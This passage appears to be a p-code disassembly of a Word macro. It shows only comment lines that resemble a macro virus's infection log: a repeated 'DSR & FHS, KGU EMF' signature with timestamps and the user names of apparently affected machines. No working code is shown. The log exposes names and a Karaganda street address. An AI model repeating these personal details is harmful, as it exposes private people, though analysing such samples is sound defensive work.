' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #761:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #762:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #763:
' 	QuoteRem 0x0000 0x0020 " 11:40:35 - пятница, 15 дек 2000"
' Line #764:
' 	QuoteRem 0x0000 0x0005 " stud"
' Line #765:
' 	QuoteRem 0x0000 0x0000 ""
' Line #766:
' Line #767:
' Line #768:
' Line #769:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #770:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #771:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #772:
' 	QuoteRem 0x0000 0x001F " 21:29:22 - четверг, 4 янв 2001"
' Line #773:
' 	QuoteRem 0x0000 0x000F " Маганов Леонид"
' Line #774:
' 	QuoteRem 0x0000 0x0000 ""
' Line #775:
' Line #776:
' Line #777:
' Line #778:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #779:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #780:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #781:
' 	QuoteRem 0x0000 0x0020 " 10:19:13 - четверг, 15 фев 2001"
' Line #782:
' 	QuoteRem 0x0000 0x000E " Администратор"
' Line #783:
' 	QuoteRem 0x0000 0x0000 ""
' Line #784:
' Line #785:
' Line #786:
' Line #787:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #788:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #789:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #790:
' 	QuoteRem 0x0000 0x0020 " 18:52:18 - пятница, 16 фев 2001"
' Line #791:
' 	QuoteRem 0x0000 0x000E " Администратор"
' Line #792:
' 	QuoteRem 0x0000 0x0000 ""
' Line #793:
' Line #794:
' Line #795:
' Line #796:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #797:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #798:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #799:
' 	QuoteRem 0x0000 0x0024 " 15:03:01 - понедельник, 19 фев 2001"
' Line #800:
' 	QuoteRem 0x0000 0x000E " Администратор"
' Line #801:
' 	QuoteRem 0x0000 0x0000 ""
' Line #802:
' Line #803:
' Line #804:
' Line #805:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #806:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #807:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #808:
' 	QuoteRem 0x0000 0x0024 " 16:01:49 - понедельник, 19 фев 2001"
' Line #809:
' 	QuoteRem 0x0000 0x0008 " 14 USER"
' Line #810:
' 	QuoteRem 0x0000 0x0000 ""
' Line #811:
' Line #812:
' Line #813:
' Line #814:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #815:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #816:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #817:
' 	QuoteRem 0x0000 0x0024 " 16:13:32 - понедельник, 19 фев 2001"
' Line #818:
' 	QuoteRem 0x0000 0x000F " Korolyeva Vera"
' Line #819:
' 	QuoteRem 0x0000 0x0000 ""
' Line #820:
' Line #821:
' Line #822:
' Line #823:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #824:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #825:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #826:
' 	QuoteRem 0x0000 0x0020 " 13:53:06 - вторник, 20 фев 2001"
' Line #827:
' 	QuoteRem 0x0000 0x000F " Korolyeva Vera"
' Line #828:
' 	QuoteRem 0x0000 0x0000 ""
' Line #829:
' Line #830:
' Line #831:
' Line #832:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #833:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #834:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #835:
' 	QuoteRem 0x0000 0x0020 " 14:04:35 - вторник, 20 фев 2001"
' Line #836:
' 	QuoteRem 0x0000 0x000F " Korolyeva Vera"
' Line #837:
' 	QuoteRem 0x0000 0x0000 ""
' Line #838:
' Line #839:
' Line #840:
' Line #841:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #842:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #843:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #844:
' 	QuoteRem 0x0000 0x0020 " 18:05:02 - вторник, 20 фев 2001"
' Line #845:
' 	QuoteRem 0x0000 0x0008 " 14 USER"
' Line #846:
' 	QuoteRem 0x0000 0x0000 ""
' Line #847:
' Line #848:
' Line #849:
' Line #850:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #851:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #852:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #853:
' 	QuoteRem 0x0000 0x001E " 14:53:03 - среда, 21 фев 2001"
' Line #854:
' 	QuoteRem 0x0000 0x0008 " 14 USER"
' Line #855:
' 	QuoteRem 0x0000 0x0000 ""
' Line #856:
' Line #857:
' Line #858:
' Line #859:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #860:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #861:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #862:
' 	QuoteRem 0x0000 0x0020 " 18:02:43 - четверг, 22 фев 2001"
' Line #863:
' 	QuoteRem 0x0000 0x0008 " 14 USER"
' Line #864:
' 	QuoteRem 0x0000 0x0000 ""
' Line #865:
' Line #866:
' Line #867:
' Line #868:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #869:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #870:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #871:
' 	QuoteRem 0x0000 0x0020 " 15:40:33 - пятница, 23 фев 2001"
' Line #872:
' 	QuoteRem 0x0000 0x000E " Администратор"
' Line #873:
' 	QuoteRem 0x0000 0x0000 ""
' Line #874:
' Line #875:
' Line #876:
' Line #877:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #878:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #879:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #880:
' 	QuoteRem 0x0000 0x0020 " 17:39:56 - пятница, 23 фев 2001"
' Line #881:
' 	QuoteRem 0x0000 0x000F " Korolyeva Vera"
' Line #882:
' 	QuoteRem 0x0000 0x0000 ""
' Line #883:
' Line #884:
' Line #885:
' Line #886:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #887:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #888:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #889:
' 	QuoteRem 0x0000 0x0024 " 21:29:57 - понедельник, 16 апр 2001"
' Line #890:
' 	QuoteRem 0x0000 0x000F " Korolyeva Vera"
' Line #891:
' 	QuoteRem 0x0000 0x0000 ""
' Line #892:
' Line #893:
' Line #894:
' Line #895:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #896:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #897:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #898:
' 	QuoteRem 0x0000 0x0020 " 11:47:30 - пятница, 18 апр 1997"
' Line #899:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #900:
' 	QuoteRem 0x0000 0x0000 ""
' Line #901:
' Line #902:
' Line #903:
' Line #904:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #905:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #906:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #907:
' 	QuoteRem 0x0000 0x0020 " 12:13:59 - пятница, 18 апр 1997"
' Line #908:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #909:
' 	QuoteRem 0x0000 0x0000 ""
' Line #910:
' Line #911:
' Line #912:
' Line #913:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #914:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #915:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #916:
' 	QuoteRem 0x0000 0x0020 " 12:37:13 - пятница, 18 апр 1997"
' Line #917:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #918:
' 	QuoteRem 0x0000 0x0000 ""
' Line #919:
' Line #920:
' Line #921:
' Line #922:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #923:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #924:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #925:
' 	QuoteRem 0x0000 0x0020 " 12:39:06 - пятница, 18 апр 1997"
' Line #926:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #927:
' 	QuoteRem 0x0000 0x0000 ""
' Line #928:
' Line #929:
' Line #930:
' Line #931:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #932:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #933:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #934:
' 	QuoteRem 0x0000 0x0020 " 12:40:22 - пятница, 18 апр 1997"
' Line #935:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #936:
' 	QuoteRem 0x0000 0x0000 ""
' Line #937:
' Line #938:
' Line #939:
' Line #940:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #941:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #942:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #943:
' 	QuoteRem 0x0000 0x0020 " 14:44:12 - пятница, 18 апр 1997"
' Line #944:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #945:
' 	QuoteRem 0x0000 0x0000 ""
' Line #946:
' Line #947:
' Line #948:
' Line #949:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #950:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #951:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #952:
' 	QuoteRem 0x0000 0x0020 " 14:47:12 - пятница, 18 апр 1997"
' Line #953:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #954:
' 	QuoteRem 0x0000 0x0000 ""
' Line #955:
' Line #956:
' Line #957:
' Line #958:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #959:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #960:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #961:
' 	QuoteRem 0x0000 0x0020 " 15:47:31 - пятница, 18 апр 1997"
' Line #962:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #963:
' 	QuoteRem 0x0000 0x0000 ""
' Line #964:
' Line #965:
' Line #966:
' Line #967:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #968:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #969:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #970:
' 	QuoteRem 0x0000 0x0020 " 17:30:26 - пятница, 18 апр 1997"
' Line #971:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #972:
' 	QuoteRem 0x0000 0x0000 ""
' Line #973:
' Line #974:
' Line #975:
' Line #976:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #977:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #978:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #979:
' 	QuoteRem 0x0000 0x0020 " 17:46:57 - пятница, 18 апр 1997"
' Line #980:
' 	QuoteRem 0x0000 0x0004 " dis"
' Line #981:
' 	QuoteRem 0x0000 0x0000 ""
' Line #982:
' Line #983:
' Line #984:
' Line #985:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #986:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #987:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #988:
' 	QuoteRem 0x0000 0x0020 " 14:25:11 - вторник, 20 апр 1999"
' Line #989:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #990:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #991:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #992:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #993:
' Line #994:
' Line #995:
' Line #996:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #997:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #998:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #999:
' 	QuoteRem 0x0000 0x0020 " 15:05:20 - вторник, 20 апр 1999"
' Line #1000:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1001:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1002:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1003:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1004:
' Line #1005:
' Line #1006:
' Line #1007:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1008:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1009:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1010:
' 	QuoteRem 0x0000 0x0020 " 15:13:50 - вторник, 20 апр 1999"
' Line #1011:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1012:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1013:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1014:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1015:
' Line #1016:
' Line #1017:
' Line #1018:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1019:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1020:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1021:
' 	QuoteRem 0x0000 0x0020 " 15:17:19 - вторник, 20 апр 1999"
' Line #1022:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1023:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1024:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1025:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1026:
' Line #1027:
' Line #1028:
' Line #1029:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1030:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1031:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1032:
' 	QuoteRem 0x0000 0x0020 " 19:22:53 - вторник, 20 апр 1999"
' Line #1033:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1034:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1035:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1036:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1037:
' Line #1038:
' Line #1039:
' Line #1040:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1041:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1042:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1043:
' 	QuoteRem 0x0000 0x001E " 14:09:10 - среда, 21 апр 1999"
' Line #1044:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1045:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1046:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1047:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1048:
' Line #1049:
' Line #1050:
' Line #1051:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1052:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1053:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1054:
' 	QuoteRem 0x0000 0x001E " 14:42:32 - среда, 21 апр 1999"
' Line #1055:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1056:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1057:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1058:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1059:
' Line #1060:
' Line #1061:
' Line #1062:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1063:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1064:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1065:
' 	QuoteRem 0x0000 0x0020 " 11:34:59 - пятница, 23 апр 1999"
' Line #1066:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1067:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1068:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1069:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1070:
' Line #1071:
' Line #1072:
' Line #1073:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1074:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1075:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1076:
' 	QuoteRem 0x0000 0x0020 " 10:07:32 - четверг, 29 апр 1999"
' Line #1077:
' 	QuoteRem 0x0000 0x000F " Анара Искакова"
' Line #1078:
' 	QuoteRem 0x0000 0x0007 " 470074"
' Line #1079:
' 	QuoteRem 0x0000 0x000E " г. Караганда,"
' Line #1080:
' 	QuoteRem 0x0000 0x0018 " ул. Университетская, 28"
' Line #1081:
' Line #1082:
' Line #1083:
' Line #1084:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1085:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1086:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1087:
' 	QuoteRem 0x0000 0x001F " 22:48:49 - пятница, 4 май 2001"
' Line #1088:
' 	QuoteRem 0x0000 0x000A " Alexandra"
' Line #1089:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1090:
' Line #1091:
' Line #1092:
' Line #1093:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1094:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1095:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1096:
' 	QuoteRem 0x0000 0x001F " 16:15:26 - вторник, 8 май 2001"
' Line #1097:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1098:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1099:
' Line #1100:
' Line #1101:
' Line #1102:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1103:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1104:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1105:
' 	QuoteRem 0x0000 0x001F " 16:52:35 - вторник, 8 май 2001"
' Line #1106:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1107:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1108:
' Line #1109:
' Line #1110:
' Line #1111:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1112:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1113:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1114:
' 	QuoteRem 0x0000 0x0024 " 17:21:06 - понедельник, 26 авг 1996"
' Line #1115:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1116:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1117:
' Line #1118:
' Line #1119:
' Line #1120:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1121:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1122:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1123:
' 	QuoteRem 0x0000 0x0024 " 23:56:41 - понедельник, 26 авг 1996"
' Line #1124:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1125:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1126:
' Line #1127:
' Line #1128:
' Line #1129:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1130:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1131:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1132:
' 	QuoteRem 0x0000 0x0020 " 03:46:08 - вторник, 27 авг 1996"
' Line #1133:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1134:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1135:
' Line #1136:
' Line #1137:
' Line #1138:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1139:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1140:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1141:
' 	QuoteRem 0x0000 0x0020 " 14:24:55 - суббота, 12 май 2001"
' Line #1142:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1143:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1144:
' Line #1145:
' Line #1146:
' Line #1147:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1148:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1149:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1150:
' 	QuoteRem 0x0000 0x0020 " 15:02:12 - суббота, 12 май 2001"
' Line #1151:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1152:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1153:
' Line #1154:
' Line #1155:
' Line #1156:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1157:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1158:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1159:
' 	QuoteRem 0x0000 0x0020 " 23:47:06 - суббота, 12 май 2001"
' Line #1160:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1161:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1162:
' Line #1163:
' Line #1164:
' Line #1165:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1166:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1167:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1168:
' 	QuoteRem 0x0000 0x0024 " 15:07:46 - воскресенье, 13 май 2001"
' Line #1169:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1170:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1171:
' Line #1172:
' Line #1173:
' Line #1174:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1175:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1176:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1177:
' 	QuoteRem 0x0000 0x0024 " 18:51:46 - воскресенье, 13 май 2001"
' Line #1178:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1179:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1180:
' Line #1181:
' Line #1182:
' Line #1183:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1184:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1185:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1186:
' 	QuoteRem 0x0000 0x0024 " 18:54:40 - воскресенье, 13 май 2001"
' Line #1187:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1188:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1189:
' Line #1190:
' Line #1191:
' Line #1192:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1193:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1194:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1195:
' 	QuoteRem 0x0000 0x0024 " 20:15:44 - воскресенье, 13 май 2001"
' Line #1196:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1198:
' Line #1199:
' Line #1200:
' Line #1201:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1202:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1203:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1204:
' 	QuoteRem 0x0000 0x0024 " 20:34:55 - воскресенье, 13 май 2001"
' Line #1205:
' 	QuoteRem 0x0000 0x000D " Vera Petrova"
' Line #1206:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1207:
' Line #1208:
' Line #1209:
' Line #1210:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1211:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #1212:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #1213:
' 	QuoteRem 0x0000 0x0020 " 21:45:04 - вторник, 27 авг 1996"
' Line #1214:
' 	QuoteRem 0x0000 0x0008 " Петрова"
' Line #1215:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1216:
' Line #1217:
' Line #1218:
' Line #1219:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #1220:
